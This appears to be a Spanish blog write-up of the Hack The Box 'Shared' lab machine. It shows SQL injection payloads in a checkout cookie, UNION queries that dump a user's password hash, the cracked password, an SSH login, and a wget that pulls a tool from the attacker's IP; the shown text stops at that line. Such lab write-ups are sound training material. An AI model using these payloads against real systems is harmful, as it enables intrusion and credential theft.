<!doctype html><html lang="es"><head><title>Shared | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una tienda de e-commerce que es vulnerable a SQLi. Con esta vulnerabilidad podemos obtener un hash de una contraseña que se reutiliza en SSH. Existe otro usuario que ejecuta ipython de forma periódica, por lo que podemos inyectar un archivo de configuración y ejecutar comandos. Este segundo usuario puede usar un binario compilado en Go que se conecta a Redis. Un análisis del binario revela una contraseña, por lo que nos podemos conectar a Redis y explotar un CVE para ejecutar código en Lua, escapar de la sandbox y ganar ejecución de comandos como root"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una tienda de e-commerce que es vulnerable a SQLi. Con esta vulnerabilidad podemos obtener un hash de una contraseña que se reutiliza en SSH. Existe otro usuario que ejecuta ipython de forma periódica, por lo que podemos inyectar un archivo de configuración y ejecutar comandos. Este segundo usuario puede usar un binario compilado en Go que se conecta a Redis. Un análisis del binario revela una contraseña, por lo que nos podemos conectar a Redis y explotar un CVE para ejecutar código en Lua, escapar de la sandbox y ganar ejecución de comandos como root"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una tienda de e-commerce que es vulnerable a SQLi. Con esta vulnerabilidad podemos obtener un hash de una contraseña que se reutiliza en SSH. Existe otro usuario que ejecuta ipython de forma periódica, por lo que podemos inyectar un archivo de configuración y ejecutar comandos. Este segundo usuario puede usar un binario compilado en Go que se conecta a Redis. Un análisis del binario revela una contraseña, por lo que nos podemos conectar a Redis y explotar un CVE para ejecutar código en Lua, escapar de la sandbox y ganar ejecución de comandos como root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una tienda de e-commerce que es vulnerable a SQLi. Con esta vulnerabilidad podemos obtener un hash de una contraseña que se reutiliza en SSH. Existe otro usuario que ejecuta ipython de forma periódica, por lo que podemos inyectar un archivo de configuración y ejecutar comandos. Este segundo usuario puede usar un binario compilado en Go que se conecta a Redis. Un análisis del binario revela una contraseña, por lo que nos podemos conectar a Redis y explotar un CVE para ejecutar código en Lua, escapar de la sandbox y ganar ejecución de comandos como root"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una tienda de e-commerce que es vulnerable a SQLi. Con esta vulnerabilidad podemos obtener un hash de una contraseña que se reutiliza en SSH. Existe otro usuario que ejecuta ipython de forma periódica, por lo que podemos inyectar un archivo de configuración y ejecutar comandos. Este segundo usuario puede usar un binario compilado en Go que se conecta a Redis. Un análisis del binario revela una contraseña, por lo que nos podemos conectar a Redis y explotar un CVE para ejecutar código en Lua, escapar de la sandbox y ganar ejecución de comandos como root"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Shared/Shared.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Shared/Shared.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Shared/Shared.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Shared"><meta property="twitter:title" content="Shared"><meta property="og:title" content="Shared"><meta property="og:url" content="https://7rocky.github.io/htb/shared/"><meta itemprop="keywords" content="cve,redis,python,sqli,password-reuse,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/shared/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/shared/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/shared/&text=Shared" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/shared/&title=Shared" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Shared</h1><time class="mt4 f6 dib tracked" datetime="2022-11-12T00:00:00+01:00">12 / 11 / 2022</time><br><p class="mb4 f6 dib tracked">11 minutos de lectura</p></header><div class="htb-image"><img alt="Shared" src="/images/HTB/Shared/Shared.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/redis" title="Redis">Redis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de <em>hashes</em> de contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#encontrando-un-sqli">Encontrando un SQLi</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#explotación-de-sqli">Explotación de SQLi</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-dan_smith">Movimiento lateral al usuario <code>dan_smith</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#análisis-de-redis_connector_dev">Análisis de <code>redis_connector_dev</code></a></li><li><a href="#explotación-de-redis">Explotación de Redis</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.172</li><li><strong>Fecha</strong>: 23 / 07 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.172 -p 22,80,443
Nmap scan report for 10.10.11.172
Host is up (0.061s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US  
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-nextprotoneg:
|   h2
|_  http/1.1
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 17.63 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.172</code>, se nos redirige a <code>https://shared.htb</code>, por lo que tenemos que meter <code>shared.htb</code> como dominio en <code>/etc/hosts</code>. Esta es la página principal:</p><p><img src="/images/HTB/Shared/Shared-index.png" alt="Shared index"></p><p>Muestra una tienda de <em>e-commerce</em> hecha con PrestaShop. Antes de enumerar la página, vamos a enumerar más subdominios con <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.172 -r -H <span class="code-dark-yellow">'Host: FUZZ.shared.htb'</span> -fl 1495  
<span class="code-dark-green">checkout                [Status: 200, Size: 3229, Words: 1509, Lines: 65, Duration: 1459ms]</span>
</code></pre></div><p>Vale, después de meter <code>checkout.shared.htb</code> en <code>/etc/hosts</code>, tenemos:</p><p><img src="/images/HTB/Shared/Shared-checkout.png" alt="Shared checkout"></p><p>Aquí podemos probar cualquier cosa y vemos un mensaje de alerta raro:</p><p><img src="/images/HTB/Shared/Shared-checkout-alert.png" alt="Shared checkout alert"></p><p>De hecho, este subdominio se usa para gestionar los pedidos desde la página principal. Podemos pinchar en cualquier producto, añadirlo al carrito y pagar. Tendremos una <em>cookie</em> de sesión que contiene la información del carrito:</p><p><img src="/images/HTB/Shared/Shared-item.png" alt="Shared item"></p><p><img src="/images/HTB/Shared/Shared-item-selected.png" alt="Shared item selected"></p><p><img src="/images/HTB/Shared/Shared-item-proceed.png" alt="Shared item proceed"></p><p><img src="/images/HTB/Shared/Shared-checkout-session.png" alt="Shared item session"></p><p>La <em>cookie</em> tiene codificación de URL, vamos a decodificarla con Node.js:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span>
Welcome to Node.js v18.7.0.
Type ".help" for more information.
&gt; decodeURIComponent('%7B%22YCS98E4A%22%3A%221%22%7D')  
<span class="code-dark-green">'{"YCS98E4A":"1"}'</span>
</code></pre></div><h3 id="encontrando-un-sqli">Encontrando un SQLi</h3><p>Vale, se trata de un documento JSON. ¿Qué pasa si modificamos la <em>cookie</em> y usamos un <em>payload</em> de inyección de código SQL? Vamos a probar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; encodeURIComponent(`{"' or 1=1-- -":"1"}`)  
<span class="code-dark-green">"%7B%22'%20or%201%3D1--%20-%22%3A%221%22%7D"
</code></pre></div><p>Ahora podemos poner la <em>cookie</em> en el navegador y ver lo que tenemos:</p><p><img src="/images/HTB/Shared/Shared-checkout-sqli.png" alt="Shared item sqli"></p><p>Si miramos bien, veremos que el producto del carrito es diferente del que teníamos antes, por lo que la inyección ha tenido efecto. Ahora podemos usar consultas <code>UNION</code> para ver el número de columnas de la tabla actual y descubrir la columna que se refleja en la página.</p><p>Finalmente, veremos que tenemos 3 columnas y que la segunda es la que se refleja:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; encodeURIComponent(`{"' union select 1,2,3-- -":"1"}`)
<span class="code-dark-green">"%7B%22'%20union%20select%201%2C2%2C3--%20-%22%3A%221%22%7D"</span>  
</code></pre></div><p><img src="/images/HTB/Shared/Shared-checkout-sqli-union.png" alt="Shared item sqli union"></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Para enumerar la base de datos, decidí escribir un <em>script</em> sencillo en Node.js llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Shared/sqli.js"><code>sqli.js</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Shared#sqlijs">aquí</a>). Tendremos esta salida en la columna reflejada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,'asdf',3-- -"</span>  
asdf
</code></pre></div><h3 id="explotación-de-sqli">Explotación de SQLi</h3><p>Vamos a realizar la enumeración básica (base de datos, usuario y versión):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,database(),3-- -"</span>  
checkout

<span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,user(),3-- -"</span>
checkout@localhost

<span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,version(),3-- -"</span>
10.5.15-MariaDB-0+deb11u1
</code></pre></div><p>Ahora vamos a listar nombres de tablas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='checkout'),3-- -"</span>  
user,product
</code></pre></div><p>Vale, <code>user</code> y <code>product</code>. La primera parece más prometedora, por lo que vamos a enumerar sus columnas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='user'),3-- -"</span>  
id,username,password
</code></pre></div><p>Obviamente, consultaremos <code>username</code> y <code>password</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,(select concat(username,':',password) from user),3-- -"</span>  
james_mason:fc895d4eddc2fc12f995e18c865cf273
</code></pre></div><p>Y con esto, tenemos un usuario y un <em>hash</em> de contraseña. Si vamos a <a href="https://crackstation.net">crackstation.net</a>, obtendremos la contraseña correspondiente (<code>Soleil101</code>) con un ataque de tabla arcoíris:</p><p><img src="/images/HTB/Shared/Shared-crackstation.png" alt="Shared crackstation"></p><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>En este punto, podemos acceder a la máquina por SSH usando las credenciales anteriores:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> james_mason@10.10.11.172
james_mason@10.10.11.172's password:
<span class="code-green">james_mason@shared</span>:<span class="code-blue">~</span>$ ls -la
total 20
drwxr-xr-x 2 james_mason james_mason 4096 Jul 14 13:46 <span class="code-blue">.</span>
drwxr-xr-x 4 root        root        4096 Jul 14 13:46 <span class="code-blue">..</span>
lrwxrwxrwx 1 root        root           9 Mar 20 09:42 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>  
-rw-r--r-- 1 james_mason james_mason  220 Mar 20 09:23 .bash_logout
-rw-r--r-- 1 james_mason james_mason 3526 Mar 20 09:23 .bashrc
-rw-r--r-- 1 james_mason james_mason  807 Mar 20 09:23 .profile
</code></pre></div><p>Pero no hay <em>flag</em> <code>user.txt</code> todavía, pertenece a otro usuario llamado <code>dan_smith</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">~</span>$ find / -name user.txt 2&gt;/dev/null  
/home/dan_smith/user.txt
<span class="code-green">james_mason@shared</span>:<span class="code-blue">~</span>$ ls /home
<span class="code-blue">dan_smith</span>  <span class="code-blue">james_mason</span>
</code></pre></div><p>Podemos ver algunos archivos relacionados con <code>ipython</code> que pertenecen a <code>dan_smith</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">~</span>$ ls -la /home/dan_smith/
total 32
drwxr-xr-x 4 dan_smith dan_smith 4096 Jul 14 13:47 <span class="code-blue">.</span>
drwxr-xr-x 4 root      root      4096 Jul 14 13:46 <span class="code-blue">..</span>
lrwxrwxrwx 1 root      root         9 Mar 20 09:42 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>  
-rw-r--r-- 1 dan_smith dan_smith  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 dan_smith dan_smith 3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 dan_smith dan_smith 4096 Jul 14 13:47 <span class="code-blue">.ipython</span>
-rw-r--r-- 1 dan_smith dan_smith  807 Aug  4  2021 .profile
drwx------ 2 dan_smith dan_smith 4096 Jul 14 13:47 <span class="code-blue">.ssh</span>
-rw-r----- 1 root      dan_smith   33 Aug  8 19:07 user.txt
<span class="code-green">james_mason@shared</span>:<span class="code-blue">~</span>$ find / -user dan_smith 2&gt;/dev/null
/home/dan_smith
/home/dan_smith/.bashrc
/home/dan_smith/.bash_logout
/home/dan_smith/.profile
/home/dan_smith/.ipython
/home/dan_smith/.ipython/profile_default
/home/dan_smith/.ipython/profile_default/startup
/home/dan_smith/.ipython/profile_default/startup/README
/home/dan_smith/.ipython/profile_default/pid
/home/dan_smith/.ipython/profile_default/history.sqlite
/home/dan_smith/.ipython/profile_default/log
/home/dan_smith/.ipython/profile_default/security
/home/dan_smith/.ipython/profile_default/db
/home/dan_smith/.ssh
</code></pre></div><p>Además, pertenecemos a un grupo llamado <code>developer</code>, y podemos escribir en <code>/opt/scripts_review</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)  
<span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ find / -group developer 2&gt;/dev/null
/opt/scripts_review
<span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ ls -la /opt/scripts_review/
total 8
drwxrwx--- 2 root developer 4096 Jul 14 13:46 <span class="code-blue">.</span>
drwxr-xr-x 3 root root      4096 Jul 14 13:46 <span class="code-blue">..
</code></pre></div><h2 id="movimiento-lateral-al-usuario-dan_smith">Movimiento lateral al usuario <code>dan_smith</code></h2><p>Si subimos <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> a la máquina y lo ejecutamos, veremos algunos comandos sospechosos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ wget -qO .pspy 10.10.17.44/pspy64s
